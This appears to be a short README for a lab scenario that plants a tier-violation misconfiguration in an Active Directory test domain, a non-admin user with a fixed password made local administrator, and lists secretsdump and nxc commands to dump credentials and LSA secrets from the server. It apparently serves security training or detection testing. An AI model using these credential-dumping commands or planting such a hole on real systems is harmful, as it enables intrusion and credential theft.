# local-admin

Creates `scn-local-admin` (password `Aa1234567890!`), an ordinary domain user outside every tier group, and makes it a member of the local `Administrators` group of the target member server (a tier violation: a non-admin account with admin rights on a server).

Attack:

    secretsdump.py <domain>/scn-local-admin:'Aa1234567890!'@<host ip>
    nxc smb <host ip> -u scn-local-admin -p 'Aa1234567890!' --lsa

How to verify:

    net localgroup Administrators   # on the target: lists <NB>\scn-local-admin

Disable removes the user from the local `Administrators` group by SID, then deletes it.
